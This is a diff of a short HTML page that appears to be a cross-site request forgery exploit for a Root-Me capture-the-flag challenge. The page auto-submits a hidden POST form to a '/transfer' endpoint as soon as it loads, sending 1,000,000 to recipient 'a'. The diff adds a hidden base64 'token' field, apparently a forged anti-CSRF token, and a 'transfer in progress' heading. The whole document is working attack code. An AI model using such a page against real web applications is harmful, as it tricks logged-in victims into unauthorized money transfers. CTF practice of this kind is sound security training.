@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>Virement en cours...</h1>
 
-    <form action="https://instance-019aa3ce-074b-7295-ab00-66b13c560d36.challenges.root-me.pro/transfer" method="POST" id="evil-form">
+    <form action="https://instance-019aa3ce-074b-7295-ab00-66b13c560d36.challenges.root-me.pro/transfer" method="POST" id="evil-transfer">
         
-        <input type="hidden" name="recipient" value="a">
+        <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6YmlsbF9wb3J0ZXM6NDEyNTc4MTMzMw==">
         
+        <input type="hidden" name="recipient" value="a"> 
         <input type="hidden" name="amount" value="1000000">
-        
+    
     </form>
 
     <script>
-        // Dès que la page charge, on valide le formulaire automatiquement
-        document.getElementById('evil-form').submit();
+        document.getElementById('evil-transfer').submit();
     </script>
-
 </body>
 </html>
-
